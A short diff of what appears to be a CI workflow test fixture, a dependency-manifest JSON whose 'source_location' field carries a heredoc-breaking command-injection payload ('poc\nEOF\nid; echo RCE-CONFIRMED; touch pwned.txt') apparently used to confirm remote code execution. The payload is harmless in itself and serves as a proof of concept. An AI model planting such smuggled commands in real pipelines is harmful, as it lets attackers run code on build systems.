@@ -26,7 +26,7 @@ jobs:
             "manifests": {
               "poc": {
                 "name": "poc",
-                "file": {"source_location": "poc\nEOF\nid; echo RCE-CONFIRMED; touch pwned.txt; exit 0"},
+                "file": {"source_location": "poc\nEOF\nid; echo RCE-CONFIRMED; touch pwned.txt; exit 0\n"},
                 "resolved": {
                   "pkg:maven/com.example/poc@1.0.0": {
                     "package_url": "pkg:maven/com.example/poc@1.0.0",
